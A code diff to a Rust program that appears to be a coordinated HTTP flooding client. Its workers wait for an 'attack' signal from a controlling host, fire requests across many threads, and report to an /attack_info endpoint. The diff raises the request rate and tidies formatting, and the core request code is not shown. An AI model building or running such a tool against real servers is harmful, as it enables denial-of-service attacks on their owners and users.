@@ -19,7 +19,7 @@ struct Worker {
     attacking: bool,
     address: String,
     client: reqwest::blocking::Client,
-    results: Arc<DashMap<u32, Vec<String>>>
+    results: Arc<DashMap<u32, Vec<String>>>,
 }
 
 impl Worker {
@@ -46,7 +46,7 @@ impl Worker {
                 Err(_) => {
                     1
                 }
-            }
+            };
         }
         1
     }
@@ -54,7 +54,7 @@ impl Worker {
 
 impl Client {
     fn new(host: String) -> Client {
-        let thread_count = std::thread::available_parallelism().unwrap().get()*4;
+        let thread_count = std::thread::available_parallelism().unwrap().get() * 4;
         let mut cl = Client {
             host_address: host,
             address: String::new(),
@@ -62,7 +62,7 @@ impl Client {
             workers: vec![],
             worker_threads: vec![],
             results: Arc::new(DashMap::with_capacity(thread_count)),
-            thread_count
+            thread_count,
         };
         cl.worker_threads.reserve(thread_count);
         for i in 0..thread_count {
@@ -95,27 +95,28 @@ impl Client {
                     let mut worker = worker_lock.unwrap();
                     worker.address = self.address.clone();
                     worker.attacking = can_attack;
+                    println!("Worker {} Can attack: {}", worker.id, worker.attacking);
                     if can_attack {
                         cv.notify_one();
                     }
                 }
                 Err(_) => {}
-        }
+            }
         }
     }
     fn thread_worker(worker: Arc<(Mutex<Worker>, Condvar)>) {
         let el = worker.clone();
         let (elem, cv) = &*el;
         loop {
-            {
-                let mut w = elem.lock().unwrap();
-                if !w.attacking {
-                    w = cv.wait_while(w, |w| !w.attacking).unwrap();
-                }
-            }
             let mut w = elem.lock().unwrap();
+            if !w.attacking {
+                w = cv.wait_while(w, |w| !w.attacking).unwrap();
+            }
+            drop(w);
+            std::thread::sleep(time::Duration::from_nanos(1)); //allows to obtain mutex control in main thread
+            let w = elem.lock().unwrap();
             let mut _r = 0;
-            for _ in 0..5 {
+            for _ in 0..100 {
                 _r = w.start_requesting();
             }
         }
@@ -137,21 +138,22 @@ impl Client {
             let time = time::Duration::from_millis(950);
             let cl = reqwest::blocking::Client::new();
             let map = &*armap;
-            loop{
+            loop {
                 std::thread::sleep(time);
                 let mut request_body_vec = Vec::new();
                 for el in map.iter() {
                     request_body_vec.extend(el.value().to_owned());
                 }
-                println!("Throughput: {}", request_body_vec.len());
+                // println!("Throughput: {}", request_body_vec.len());
                 if request_body_vec.len() >= 20 {
                     cl.post(format!("{}/attack_info", addr.to_owned().clone())).json(&request_body_vec).send().unwrap();
                     map.alter_all(|_, mut v| {
                         v.clear();
                         v
                     });
+                }
             }
-        }});
+        });
         loop {
             self.can_attack();
         }
